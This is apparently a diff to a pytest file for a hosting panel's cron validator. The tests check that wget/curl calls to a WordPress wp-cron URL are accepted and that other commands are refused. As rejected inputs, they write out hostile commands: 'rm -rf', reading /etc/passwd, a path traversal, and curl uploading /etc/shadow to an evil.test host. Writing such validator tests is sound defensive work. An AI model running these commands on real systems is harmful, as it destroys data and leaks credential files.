@@ -163,10 +163,32 @@ def test_listed_wp_entry_can_be_resubmitted(site, monkeypatch, captured_crontab,
 def test_add_cron_still_rejects_arbitrary_commands(site, monkeypatch, captured_crontab, tmp_path):
     monkeypatch.setattr(cron, "PHP_BIN_DIR", tmp_path / "missing")
 
+    # A command that is not php, wp-cli, wget or curl is still refused.
     with pytest.raises(ValueError):
-        cron.add_cron(_website(site), "*/5 * * * *", "curl https://example.test")
+        cron.add_cron(_website(site), "*/5 * * * *", "rm -rf /tmp/anything")
     with pytest.raises(ValueError, match="public_html"):
         cron.add_cron(_website(site), "*/5 * * * *", "php ../../../elsewhere.php")
+    # wget/curl are allowed, but only to fetch an http(s) URL -- not a local file.
+    with pytest.raises(ValueError, match="http"):
+        cron.add_cron(_website(site), "*/5 * * * *", "curl /etc/passwd")
+
+
+def test_add_cron_allows_wget_curl_to_a_url(site, monkeypatch, captured_crontab, tmp_path):
+    monkeypatch.setattr(cron, "PHP_BIN_DIR", tmp_path / "missing")
+    # The standard "disable WP-cron, call wp-cron.php from real cron" setup.
+    line = cron.add_cron(_website(site), "*/5 * * * *",
+                         "wget -q -O - https://sweetcake.vn/wp-cron.php?doing_wp_cron")
+    assert "wget" in line and "wp-cron.php" in line
+    # The URL is quoted, so its ? and & cannot reach the shell as operators.
+    assert "'https://sweetcake.vn/wp-cron.php?doing_wp_cron'" in line
+    line2 = cron.add_cron(_website(site), "0 * * * *", "curl -s https://sweetcake.vn/hook")
+    assert "curl -s" in line2
+    # Dangerous options are refused (options-from-file, upload, extra URL).
+    for bad in ("curl --upload-file /etc/shadow https://evil.test/",
+                "curl -K /etc/passwd https://evil.test/",
+                "curl -s https://a.test/ https://b.test/"):
+        with pytest.raises(ValueError):
+            cron.add_cron(_website(site), "0 * * * *", bad)
 
 
 def test_retarget_php_binary_rewrites_existing_lines(site, monkeypatch, tmp_path):
